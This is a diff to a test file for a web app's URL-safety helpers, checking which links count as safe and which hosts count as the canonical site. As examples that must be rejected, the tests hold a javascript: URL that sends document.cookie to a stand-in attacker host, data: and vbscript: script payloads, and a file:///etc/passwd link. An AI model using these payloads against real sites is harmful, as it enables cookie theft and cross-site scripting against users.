@@ -7,19 +7,18 @@ const { mockGetEnv } = vi.hoisted(() => ({
   mockGetEnv: vi.fn<(key: string) => string | undefined>(),
 }))
 
+vi.unmock('@/lib/core/utils/urls')
 vi.mock('@/lib/core/config/env', () => ({
   env: {},
   getEnv: mockGetEnv,
-}))
-
-vi.mock('@/lib/core/config/env-flags', () => ({
-  isProd: false,
 }))
 
 import {
   getBrowserOrigin,
   getSocketUrl,
   isLocalhostUrl,
+  isNonCanonicalSimHost,
+  isSafeHttpUrl,
   parseOriginList,
 } from '@/lib/core/utils/urls'
 
@@ -131,5 +130,75 @@ describe('isLocalhostUrl', () => {
     expect(isLocalhostUrl('https://app.example.com')).toBe(false)
     expect(isLocalhostUrl('not-a-url')).toBe(false)
     expect(isLocalhostUrl('')).toBe(false)
+  })
+})
+
+describe('isSafeHttpUrl', () => {
+  it('allows absolute http(s) URLs', () => {
+    expect(isSafeHttpUrl('https://example.com/file.pdf')).toBe(true)
+    expect(isSafeHttpUrl('http://example.com/file.pdf')).toBe(true)
+  })
+
+  it('allows same-origin relative URLs (resolved against the browser origin)', () => {
+    expect(isSafeHttpUrl('/api/files/serve/abc?context=execution')).toBe(true)
+  })
+
+  it('rejects javascript: URLs', () => {
+    expect(isSafeHttpUrl("javascript:fetch('//attacker.example/c?'+document.cookie)")).toBe(false)
+    expect(isSafeHttpUrl('JavaScript:alert(1)')).toBe(false)
+  })
+
+  it('rejects other script-capable or non-navigable schemes', () => {
+    expect(isSafeHttpUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
+    expect(isSafeHttpUrl('vbscript:msgbox(1)')).toBe(false)
+    expect(isSafeHttpUrl('blob:https://example.com/uuid')).toBe(false)
+    expect(isSafeHttpUrl('file:///etc/passwd')).toBe(false)
+  })
+
+  it('treats relative junk as same-origin http (safe) rather than throwing', () => {
+    expect(isSafeHttpUrl('')).toBe(true)
+    expect(isSafeHttpUrl('not a url')).toBe(true)
+  })
+
+  it('rejects unparseable absolute input without throwing', () => {
+    expect(isSafeHttpUrl('http://')).toBe(false)
+  })
+})
+
+describe('isNonCanonicalSimHost', () => {
+  it.each(['www.sim.ai', 'sim.ai', 'WWW.SIM.AI', 'www.sim.ai:443'])(
+    'treats %s as the canonical marketing site',
+    (host) => {
+      expect(isNonCanonicalSimHost(host)).toBe(false)
+    }
+  )
+
+  it.each(['dev.sim.ai', 'www.dev.sim.ai', 'staging.sim.ai', 'prod.sockets.sim.ai'])(
+    'treats %s as non-canonical',
+    (host) => {
+      expect(isNonCanonicalSimHost(host)).toBe(true)
+    }
+  )
+
+  it.each(['sim.example.com', 'localhost:3000', 'notsim.ai', 'sim.ai.evil.com'])(
+    'leaves %s alone',
+    (host) => {
+      expect(isNonCanonicalSimHost(host)).toBe(false)
+    }
+  )
+
+  it.each(['www.sim.ai, dev.sim.ai', 'sim.ai,dev.sim.ai', '  www.sim.ai , staging.sim.ai'])(
+    'classifies a comma-joined forwarded host by its first entry (%s)',
+    (host) => {
+      expect(isNonCanonicalSimHost(host)).toBe(false)
+    }
+  )
+
+  it('still flags a comma-joined host whose first entry is non-canonical', () => {
+    expect(isNonCanonicalSimHost('dev.sim.ai, www.sim.ai')).toBe(true)
+  })
+
+  it('does not throw on an empty host', () => {
+    expect(isNonCanonicalSimHost('')).toBe(false)
   })
 })
